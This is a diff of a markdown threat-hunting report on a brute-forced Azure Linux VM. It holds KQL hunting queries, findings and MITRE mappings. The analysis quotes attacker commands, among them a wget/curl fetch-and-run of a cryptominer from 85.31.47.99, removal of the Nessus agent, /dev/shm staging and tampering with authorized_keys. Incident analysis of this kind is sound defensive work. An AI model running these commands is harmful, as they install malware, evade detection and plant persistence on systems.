@@ -1,42 +1,53 @@
 $${{\color{Goldenrod}\Huge{\textsf{  Threat \ Hunting \ Report\ \}}}}\$$
 
 
-${{\color{Goldenrod}\large{\textsf{Summary\ }}}}\$
+$${{\color{Goldenrod}\large{\textsf{Abstract\ }}}}\$$
+
+This report details a proactive threat hunt initiated after receiving an alert from Microsoft regarding brute-force login attempts targeting enterprise accounts. The investigation focuses on identifying Indicators of Compromise (IOCs) associated with unauthorized authentication attempts, potential credential stuffing, and subsequent adversarial activities aimed at covering tracks.
+
+The MITRE ATT&CK framework is used to map observed techniques, including:
+- T1110 - Brute Force (Initial Access) – Repeated authentication attempts to compromise valid credentials.
+- T1070 - Indicator Removal on Host (Defense Evasion) – Deletion or modification of logs to erase evidence of unauthorized access.
+- T1562 - Impair Defenses (Defense Evasion) – Disabling or tampering with security logs and audit policies.
+- T1078 - Valid Accounts (Persistence) – Use of compromised credentials to maintain unauthorized access.
 <br> </br>
-A report from Microsot Azure indicated that there was a violation of the Acceptable ue policy
+
+The report from Microsot Azure indicated that there was a violation of the Acceptable ue policy
 Activity Summary 
 - Date: 3/18/2025 6:40:40 AM
 - Description: External reports of Brute Force traffic from you resource where recieved
 - Reported Source: 20.81.228.191
 <br> </br>
-
-${{\color{Goldenrod}\large{\textsf{Logon Events\ }}}}\$
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+${{\color{Goldenrod}\large{\textsf{Device Info\ }}}}\$
 ```
 DeviceInfo
 | where PublicIP == "20.81.228.191"
 ```
-${{\color{Red}\large{\textsf{Findings:\ }}}}\$ Device name was identified as "sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net"
-
+${{\color{Red}\large{\textsf{Findings:\ }}}}\$
+- Device name was identified as "sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net"
 
 ${{\color{LightSkyBlue}\large{\textsf{MITRE ATTACK References:\ }}}}\$
-- T1592 Gathering Victim Host information
-- This indicates that the default passwords for vm's was compromised 
+- T1592:Gathering Victim Host information
+- Detection:
 <br></br>
-
-
-
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+${{\color{Goldenrod}\large{\textsf{Device Logon Events\ }}}}\$
 ```
 DeviceLogonEvents
 | where DeviceName == "sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net"
 | where ActionType == "LogonFailed"
 | summarize count()by ActionType, FailureReason, DeviceName
 ```
-${{\color{Red}\large{\textsf{Findings:\ }}}}\$ Device had 308 failed logon attempts indicateing evidence of brute force attempt
+${{\color{Red}\large{\textsf{Findings:\ }}}}\$ 
+- Device had 308 failed logon attempts indicateing evidence of brute force attempt
+
+${{\color{LightSkyBlue}\large{\textsf{MITRE ATTACK References:\ }}}}\$
+- T1110: Brute Force
+- Detection:
 <br></br>
-
-${{\color{Goldenrod}\large{\textsf{Network Activity\ }}}}\$
-
-
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+${{\color{Goldenrod}\large{\textsf{Device Network Events\ }}}}\$
 ```
 DeviceNetworkEvents
 | where DeviceName == "sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net"
@@ -57,41 +68,52 @@ ${{\color{Red}\large{\textsf{Findings:\ }}}}\$
 | 20.60.180.65    | 1     |
 | 196.251.73.38   | 3     |
 | 10.0.0.0        | 1     |
-
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 <br> </br>
-
+${{\color{Goldenrod}\large{\textsf{Device Network Events\ }}}}\$
 ```
 DeviceNetworkEvents
 | where DeviceName == "sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net"
 |summarize totalcount =count()
 ```
-${{\color{Red}\large{\textsf{Findings:\ }}}}\$: Total count of 184782
+${{\color{Red}\large{\textsf{Findings:\ }}}}\$: 
+- Total count of 184782
 - the device attempted to connect to various ip addresses that 184782 times.
 <br> </br>
 
-${{\color{Goldenrod}\large{\textsf{File Events\ }}}}\$
-
-
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+${{\color{Goldenrod}\large{\textsf{Device File Events\ }}}}\$
 ```
 DeviceFileEvents
 | where DeviceName == "sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net"
 | where ActionType == "FileCreated"
 | summarize count() by ActionType
 ```
-${{\color{Red}\large{\textsf{Findings:\ }}}}\$ There were a total of 592 Files created
+${{\color{Red}\large{\textsf{Findings:\ }}}}\$ 
+- There were a total of 592 Files created
+
+${{\color{LightSkyBlue}\large{\textsf{MITRE ATTACK References:\ }}}}\$
+- T1565: Data Manipulation
+- Detection: File Creation, File Deletion, File Modification
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 <br> </br>
-
-
+${{\color{Goldenrod}\large{\textsf{Device File Events\ }}}}\$
 ```
 DeviceFileEvents
 | where DeviceName == "sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net"
 | where ActionType == "FileDeleted" 
 | summarize count()by ActionType
 ```
-${{\color{Red}\large{\textsf{Findings:\ }}}}\$ There was a total of 7025 deleted files
-<br> </br>
+${{\color{Red}\large{\textsf{Findings:\ }}}}\$
+- There was a total of 7025 deleted files
 
-${{\color{Goldenrod}\large{\textsf{Process Events\}}}}\$
+${{\color{LightSkyBlue}\large{\textsf{MITRE ATTACK References:\ }}}}\$
+- T1565: Data Manipulation
+- Detection: File Creation, File Deletion, File Modification
+<br> </br>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+${{\color{Goldenrod}\large{\textsf{Device Process Events\}}}}\$
 ```
 DeviceProcessEvents
 | where DeviceName == "sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net"
@@ -105,9 +127,16 @@ Output
 ${{\color{Red}\large{\textsf{Findings:\ }}}}\$
 - this command .update-logs is an attempt to remain stealth
 - dev/null - is used to prevent logging
+<br> </br>
 
+${{\color{LightSkyBlue}\large{\textsf{MITRE ATTACK References:\ }}}}\$
+- T1222: File and directory permissions modiciation
+- Tactic: Defense Evation
+<br></br>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+${{\color{Goldenrod}\large{\textsf{Device Process Events\}}}}\$
 
-${{\color{Goldenrod}\large{\textsf{Detecting Suspicious Process Execution\}}}}\$
+${{\color{Greenyellow}\small{\textsf{Detecting Suspicious Process Execution\}}}}\$
 ```
 DeviceProcessEvents
 | where Timestamp > ago(7d) 
@@ -116,14 +145,16 @@ DeviceProcessEvents
 | project Timestamp, DeviceName, InitiatingProcessAccountName, FileName, ProcessCommandLine
 | order by Timestamp desc
 ```
+${{\color{Red}\large{\textsf{Findings:\ }}}}\$
 - This detected execution of risky commands such as (wget,curl,chmod,etc)
 - This query aslo flags processes operating in temporary directories
-
-${{\color{Red}\large{\textsf{Findings:\ }}}}\$
+<br></br>
 chmod +x /var/tmp/.update-logs/.bisis
 - files with a . prefix are hidden which is a commone method to avoid detection
+<br></br>
 rm -f /tmp/tmp.4O5WBRQSz9 /tmp/tmp.A6UVHHtvt2 /tmp/tmp.qG8pAKPeQc
 - rm -f forcefully deletes files without prompting, this file maybe used to hide the payload
+<br></br>
 wget https://secure.eicar.org/eicar.com.txt -O /tmp/eicar.txt
 - potential attempt by the attacker to bypass antivirus detection
 ```
@@ -203,42 +234,57 @@ Miner
 - it extracts all valid system users from /etc/password
 - then it generates a password list of common patterns
 - pkill xmrig,killaall cnrig, killall xmrig: kills exisiting cryptominers
+<br></br>
+
+## Script Commands  
 ```
 wget -q 85.31.47.99/.NzJjOTYwxx5/.balu || curl -O -s -L 85.31.47.99/.NzJjOTYwxx5/.balu
 chmod +x cache
 ./cache >/dev/null 2>&1 & disown
 ```
+${{\color{Red}\large{\textsf{Findings:\ }}}}\$ 
 - this downloads and tuns new cryptomining malware from a malicious server 85.31.47.99
 - then rm -f is used to remove log and history
 - crontab -r : aims to prevent system admins from scheduling security scans
+<br></br>
 
-
-
+## Script Commands 
 ```
 rm -rf /etc/sysctl.conf
 echo "fs.file-max = 2097152" > /etc/sysctl.conf
 sysctl -p
 ```
-${{\color{Red}\large{\textsf{Findings:\ }}}}\$ Attempts to Modify SYsyem Limits(Priviledge Escalation)
+${{\color{Red}\large{\textsf{Findings:\ }}}}\$ 
+- Attempts to Modify SYsyem Limits(Priviledge Escalation)
 - allowing more files to be open for intensive mining
+<br></br>
 
+## Script Commands
 ```
 mkdir /dev/shm/.x
 cd /dev/shm/.x
 mv network .x/
 ```
-${{\color{Red}\large{\textsf{Findings:\ }}}}\$  /dev/shm/ is used to execute files in RAM, avoiding disk-based detection
+${{\color{Red}\large{\textsf{Findings:\ }}}}\$  
+- /dev/shm/ is used to execute files in RAM, avoiding disk-based detection
+<br></br>
 
+## Script Commands 
 ```
 chattr -iae ~/.ssh/authorized_keys
 ```
+${{\color{Red}\large{\textsf{Findings:\ }}}}\$ 
+- Could disable SSH security and inset an attackers key for persitance
+<br></br>
 
-${{\color{Red}\large{\textsf{Findings:\ }}}}\$ Could disable SSH security and inset an attackers key for persitance
-
+## Script Commands 
 ```
 rm -f /opt/nessus_agent/var/nessus/tmp/nessusagent
 ```
-${{\color{Red}\large{\textsf{Findings:\ }}}}\$Attacker is forcibly removing the nessus agent to avoid detection as well as prevent vulnerability scanning of the vm
+${{\color{Red}\large{\textsf{Findings:\ }}}}\$ 
+- Attacker is forcibly removing the nessus agent to avoid detection as well as prevent vulnerability scanning of the vm
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
 ## Conclusion
 Summarize the overall findings, potential impact, and next steps or recommendations.
 
